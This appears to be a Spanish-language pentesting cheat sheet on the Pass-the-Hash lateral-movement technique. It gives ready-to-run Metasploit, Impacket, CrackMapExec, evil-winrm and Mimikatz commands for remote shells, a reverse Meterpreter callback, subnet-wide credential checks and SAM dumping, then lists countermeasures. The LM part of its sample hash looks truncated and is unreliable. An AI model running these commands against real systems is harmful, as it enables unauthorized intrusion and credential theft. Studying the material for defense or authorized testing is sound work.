# Pass-the-Hash (PtH)

## Descripción
Pass-the-Hash (PtH) es una técnica de movimiento lateral que permite a un atacante autenticarse en un servicio remoto usando directamente el hash NTLM de un usuario, sin necesidad de conocer o crackear la contraseña en texto plano. Esto es posible porque el protocolo NTLM de Windows utiliza el hash de la contraseña para la autenticación, no la contraseña en sí. Una vez obtenidos los hashes mediante credential dumping (SAM, LSASS, NTDS.dit), el atacante puede reutilizarlos para acceder a otros sistemas donde esas credenciales sean válidas, expandiendo significativamente el alcance del compromiso. Esta técnica es especialmente devastadora en entornos Active Directory donde las mismas credenciales de administrador local se reutilizan en múltiples máquinas.

## Clasificación
- **Fase**: Post-Explotación
- **MITRE ATT&CK**: T1550.002 (Use Alternate Authentication Material: Pass the Hash)
- **Plataforma**: Windows
- **Dificultad**: Intermedia

## Herramientas
- **psexec.py** (Impacket) — ejecución remota de comandos vía SMB usando hashes NTLM
- **Metasploit** (`exploit/windows/smb/psexec`) — módulo PsExec con soporte de autenticación por hash
- **CrackMapExec** (`cme smb`, `--pass-the-hash`) — herramienta multipropósito para PtH en múltiples hosts
- **evil-winrm** (`-H`) — shell interactivo WinRM con autenticación por hash
- **wmiexec.py** (Impacket) — ejecución remota vía WMI usando hashes
- **smbexec.py** (Impacket) — alternativa a PsExec vía SMB

## Comandos / Ejemplos

### Pass-the-Hash con Metasploit PsExec
```
# Módulo PsExec con hash NTLM
use exploit/windows/smb/psexec
set RHOSTS 10.10.10.50
set SMBUser Administrator
set SMBPass aad3b435b51404ee:e3c61a68f1b89ee6c8ba9507378dc88d
# Formato: LM_HASH:NTLM_HASH (usar aad3b... como LM si no se tiene)
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.5
set TARGET "Native upload"
exploit

# Resultado: sesión Meterpreter como NT AUTHORITY\SYSTEM
```

### Pass-the-Hash con Impacket
```bash
# PsExec con hash
impacket-psexec -hashes aad3b435b51404ee:e3c61a68f1b89ee6c8ba9507378dc88d Administrator@10.10.10.50
# Resultado: shell interactivo como SYSTEM

# WMIExec (más sigiloso, no crea servicio)
impacket-wmiexec -hashes :e3c61a68f1b89ee6c8ba9507378dc88d Administrator@10.10.10.50

# SMBExec (alternativa)
impacket-smbexec -hashes :e3c61a68f1b89ee6c8ba9507378dc88d Administrator@10.10.10.50

# Acceder a shares SMB con hash
impacket-smbclient -hashes :e3c61a68f1b89ee6c8ba9507378dc88d Administrator@10.10.10.50
```

### Pass-the-Hash con CrackMapExec
```bash
# Verificar credenciales en un host
crackmapexec smb 10.10.10.50 -u Administrator -H e3c61a68f1b89ee6c8ba9507378dc88d

# Ejecutar comando remoto
crackmapexec smb 10.10.10.50 -u Administrator -H e3c61a68f1b89ee6c8ba9507378dc88d -x "whoami"
crackmapexec smb 10.10.10.50 -u Administrator -H e3c61a68f1b89ee6c8ba9507378dc88d -x "ipconfig"

# Verificar credenciales en toda una subred
crackmapexec smb 10.10.10.0/24 -u Administrator -H e3c61a68f1b89ee6c8ba9507378dc88d
# Resultado: (Pwn3d!) indica acceso administrativo exitoso

# Dumping de hashes SAM remotos tras PtH exitoso
crackmapexec smb 10.10.10.50 -u Administrator -H e3c61a68f1b89ee6c8ba9507378dc88d --sam

# Pass-the-Hash vía WinRM
crackmapexec winrm 10.10.10.50 -u Administrator -H e3c61a68f1b89ee6c8ba9507378dc88d -x "whoami"
```

### Pass-the-Hash con Evil-WinRM
```bash
# Shell interactivo WinRM con hash (puerto 5985)
evil-winrm -i 10.10.10.50 -u Administrator -H e3c61a68f1b89ee6c8ba9507378dc88d

# Resultado: shell PowerShell interactivo
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
corp\administrator
```

### Variante: Pass-the-Ticket (Kerberos)
```bash
# Exportar tickets Kerberos con Mimikatz
mimikatz # sekurlsa::tickets /export

# Inyectar ticket en la sesión actual
mimikatz # kerberos::ptt ticket.kirbi

# Usar ticket para acceder a recursos
dir \\server\share
```

## Contramedidas
- Implementar LAPS (Local Administrator Password Solution) para que cada máquina tenga una contraseña de administrador local única
- Deshabilitar la autenticación NTLM donde sea posible y forzar Kerberos
- Aplicar el modelo de tiering de Active Directory: no usar credenciales de Tier 0 en hosts de Tier 1/2
- Habilitar Credential Guard para proteger hashes en memoria
- Habilitar la política "Network access: Restrict clients allowed to make remote calls to SAM"
- Monitorear autenticaciones NTLM: Event ID 4624 con LogonType 3 (Network) y NtlmV1/V2 en Event ID 4625
- Implementar detección de movimiento lateral con herramientas SIEM correlacionando logons desde IPs inusuales
- Usar cuentas de servicio administradas (gMSA) con rotación automática de contraseñas

## Referencias
- MITRE Corporation. (2024). ATT&CK Technique T1550.002: Use Alternate Authentication Material: Pass the Hash. https://attack.mitre.org/techniques/T1550/002/
- fortra. (s.f.). *Impacket* [Software]. GitHub. https://github.com/fortra/impacket
- Hackplayers. (s.f.). *Evil-WinRM* [Software]. GitHub. https://github.com/Hackplayers/evil-winrm
- byt3bl33d3r. (s.f.). *CrackMapExec* [Software]. GitHub. https://github.com/byt3bl33d3r/CrackMapExec
- Kim, P. (2018). *The Hacker Playbook 3*. Secure Planet, LLC.
- Harper, A., Linn, R., Sims, S., & Baucom, M. (2018). *Gray Hat Hacking* (5th ed.). McGraw-Hill Education.
